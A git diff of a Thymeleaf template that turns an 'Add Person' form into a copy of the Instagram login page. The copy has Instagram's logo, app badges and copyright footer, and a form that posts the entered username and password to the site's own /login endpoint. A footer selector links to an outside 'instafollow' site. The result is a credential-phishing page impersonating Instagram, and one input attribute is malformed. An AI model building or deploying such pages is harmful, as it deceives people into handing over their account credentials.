@@ -3,28 +3,9 @@
 <head>
     <meta charset="UTF-8" />
     <title>Add Person</title>
-    <link rel="stylesheet" th:href="@{/css/main.css}"/>
+    <link rel="stylesheet" th:href="@{/css/insta.css}"/>
 </head>
-<body>
-
-<!--
-   In Thymeleaf the equivalent of
-   JSP's ${pageContext.request.contextPath}/edit.html
-   would be @{/edit.html}
-   -->
-
-<!--<form th:action="@{/addPerson}"
-      th:object="${personForm}" method="POST">
-    First Name:
-    <input type="text" th:field="*{username}" />
-    <br/>
-    Last Name:
-    <input type="text" th:field="*{password}" />
-    <br/>
-    <input type="submit" value="Create" />
-</form>-->
-
-<!--<br/>-->
+<!--<body>
 
 <div class="container">
     <div class="box">
@@ -64,12 +45,106 @@
     </div>
 </div>
 
-<!-- Check if errorMessage is not null and not empty -->
+&lt;!&ndash; Check if errorMessage is not null and not empty &ndash;&gt;
 
 <div th:if="${errorMessage}" th:utext="${errorMessage}"
      style="color:red;font-style:italic;text-align:center;">
     ...
 </div>
 
+</body>-->
+
+<body>
+<span id="root">
+    <section class="section-all">
+
+      <!-- 1-Role Main -->
+      <main class="main" role="main">
+        <div class="wrapper">
+          <article class="article">
+            <div class="content">
+              <div class="login-box">
+                <div class="header">
+                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+                </div><!-- Header end -->
+                <div class="form-wrap">
+                  <form class="form" th:action="@{/login}" th:object="${personForm}" method="POST">
+
+                    <div class="input-box">
+                      <input  th:field="*{username} type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
+                    </div>
+
+                    <div class="input-box">
+                      <input th:field="*{password}" type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                    </div>
+
+                    <span class="button-box">
+                      <button class="btn" type="submit" name="submit">Log in</button>
+                    </span>
+
+                    <a class="forgot" href="">Forgot password?</a>
+                  </form>
+                </div> <!-- Form-wrap end -->
+              </div> <!-- Login-box end -->
+
+              <div class="login-box">
+                <p class="text">Don't have an account?<a href="#">Sign up</a></p>
+              </div> <!-- Signup-box end -->
+
+              <div class="app">
+                <p>Get the app.</p>
+                <div class="app-img">
+                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
+                  </a>
+                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
+                  </a>
+                </div>  <!-- App-img end-->
+              </div> <!-- App end -->
+            </div> <!-- Content end -->
+          </article>
+        </div> <!-- Wrapper end -->
+      </main>
+
+        <!-- 2-Role Footer -->
+      <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+
+          <nav class="footer-nav" role="navigation">
+            <ul>
+              <li><a href="">About Us</a></li>
+              <li><a href="">Support</a></li>
+              <li><a href="">Blog</a></li>
+              <li><a href="">Press</a></li>
+              <li><a href="">Api</a></li>
+              <li><a href="">Jobs</a></li>
+              <li><a href="">Privacy</a></li>
+              <li><a href="">Terms</a></li>
+              <li><a href="">Directory</a></li>
+              <li>
+                <span class="language">Language
+                  <select name="language" class="select" onchange="la(this.value)">
+                    <option value="#">English</option>
+                    <option value="http://ru-instafollow.bitballoon.com">Russian</option>
+                  </select>
+                </span>
+              </li>
+            </ul>
+          </nav>
+
+          <span class="footer-logo">&copy; 2018 Instagram</span>
+        </div> <!-- Footer container end -->
+      </footer>
+
+    </section>
+  </span> <!-- Root -->
+
+<!-- Select Link -->
+<script type="text/javascript">
+    function la(src) {
+      window.location=src;
+    }
+  </script>
 </body>
 </html>
